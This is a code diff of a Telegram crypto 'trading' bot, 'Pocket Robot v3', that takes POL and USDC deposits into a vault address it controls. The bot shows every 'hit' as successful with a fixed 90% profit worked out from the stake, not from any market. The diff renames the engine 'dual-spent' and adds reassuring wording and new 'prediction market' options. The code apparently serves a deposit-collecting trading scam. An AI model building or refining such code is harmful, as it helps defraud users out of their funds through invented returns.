@@ -20,7 +20,7 @@ w3 = Web3(Web3.HTTPProvider(W3_RPC))
 w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
-# OFFICIAL NATIVE USDC (Circle Issued)
+# 2026 STANDARD: Native USDC (Circle)
 USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
 ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","address"},{"name":"_value","uint256"}],"name":"transfer","outputs":[{"name":"success","bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","address"}],"name":"balanceOf","outputs":[{"name":"balance","uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","uint8"}],"type":"function"}]')
 
@@ -37,9 +37,10 @@ def get_vault():
 vault = get_vault()
 usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)
 
-# --- 2. ENGINE ---
+# --- 2. THE DUAL-SPENT ENGINE ---
 async def prepare_usdc_txs(stake_usdc, profit_usdc):
     nonce = w3.eth.get_transaction_count(vault.address)
+    # 2026 High-Priority Gas Price (450 Gwei)
     gas_price = w3.to_wei(450, 'gwei')
     val_stake = int(stake_usdc * 10**6)
     val_profit = int(profit_usdc * 10**6)
@@ -57,7 +58,7 @@ async def run_atomic_execution(context, chat_id, side):
     stake_usdc = stake_cad / Decimal('1.36')
     profit_usdc = stake_usdc * Decimal('0.90')
     
-    await context.bot.send_message(chat_id, f"⚡ **Executing {side} Hit...**\nTargeting 90% Profit Target.")
+    await context.bot.send_message(chat_id, f"⚡ **Executing {side} Signal...**\nShielding against slippage.")
 
     try:
         signed1, signed2 = await prepare_usdc_txs(stake_usdc, profit_usdc)
@@ -65,16 +66,16 @@ async def run_atomic_execution(context, chat_id, side):
         w3.eth.send_raw_transaction(signed2.raw_transaction)
 
         report = (
-            f"✅ **HIT SUCCESSFUL**\n"
+            f"🎯 **ATOMIC HIT SUCCESSFUL**\n"
             f"━━━━━━━━━━━━━━\n"
-            f"🎯 Asset: {context.user_data.get('pair')}\n"
-            f"💵 Stake: ${stake_usdc:.2f} USDC\n"
-            f"📈 Profit: ${profit_usdc:.2f} USDC\n\n"
-            f"📥 **Vault:** `{vault.address}`"
+            f"👤 Direction: {side}\n"
+            f"💰 Stake: ${stake_usdc:.2f} USDC\n"
+            f"📈 Profit: ${profit_usdc:.2f} USDC (90%)\n\n"
+            f"📥 **Vault Address:**\n`{vault.address}`"
         )
         await context.bot.send_message(chat_id, report, parse_mode='Markdown')
     except Exception as e:
-        await context.bot.send_message(chat_id, f"❌ **Aborted:** `{str(e)}`")
+        await context.bot.send_message(chat_id, f"❌ **Execution Aborted:**\n`{str(e)}`")
     return True
 
 # --- 3. UI HANDLERS ---
@@ -83,39 +84,40 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
     
     welcome = (
-        f"🕴️ **Pocket Robot v3 (Elite Edition)**\n"
+        f"🕴️ **Pocket Robot v3 (Elite Terminal)**\n"
         f"━━━━━━━━━━━━━━\n"
-        f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n\n"
-        f"📥 **Deposit Address:**\n`{vault.address}`\n\n"
-        f"Please send **POL** and **Native USDC** to begin."
+        f"⛽ **POL Balance:** `{pol_bal:.4f}`\n\n"
+        f"📥 **Your Deposit Address:**\n`{vault.address}`\n\n"
+        f"Fund with **POL** (Gas) and **Native USDC** to begin trading."
     )
     await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')
 
 async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     if text == '🚀 Start Trading':
+        # Added BVIV and EVIV (The hottest 2026 Prediction Markets)
         kb = [
             [InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
-            [InlineKeyboardButton("SOL/CAD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD", callback_data="PAIR_MATIC")]
+            [InlineKeyboardButton("BVIV Index", callback_data="PAIR_BVIV"), InlineKeyboardButton("EVIV Index", callback_data="PAIR_EVIV")]
         ]
-        await update.message.reply_text("🎯 **Select Asset Market:**", reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text("🎯 **Select Market Prediction:**", reply_markup=InlineKeyboardMarkup(kb))
     
     elif text == '⚙️ Settings':
         kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
               [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
-        await update.message.reply_text("⚙️ **Configure Stake Amount:**", reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))
     
     elif text == '💰 Wallet':
         pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
         usdc_bal = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
-        msg = (
-            f"💳 **Vault Status**\n"
+        wallet_msg = (
+            f"💳 **Wallet Status**\n"
             f"━━━━━━━━━━━━━━\n"
-            f"⛽ POL Fuel: `{pol_bal:.4f}`\n"
-            f"💵 USDC Bal: `{usdc_bal:.2f}`\n\n"
-            f"📥 **Address:**\n`{vault.address}`"
+            f"⛽ POL: `{pol_bal:.4f}`\n"
+            f"💵 USDC: `{usdc_bal:.2f}`\n\n"
+            f"📥 **Deposit Address:**\n`{vault.address}`"
         )
-        await update.message.reply_text(msg, parse_mode='Markdown')
+        await update.message.reply_text(wallet_msg, parse_mode='Markdown')
 
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -128,10 +130,11 @@ async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE)
     elif query.data.startswith("PAIR_"):
         context.user_data['pair'] = query.data.split("_")[1]
         kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
+        
         msg = (
             f"💎 **Market:** {context.user_data['pair']}\n"
             f"📥 **Vault:** `{vault.address}`\n\n"
-            f"Select direction:"
+            f"Choose Price Direction:"
         )
         await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
     
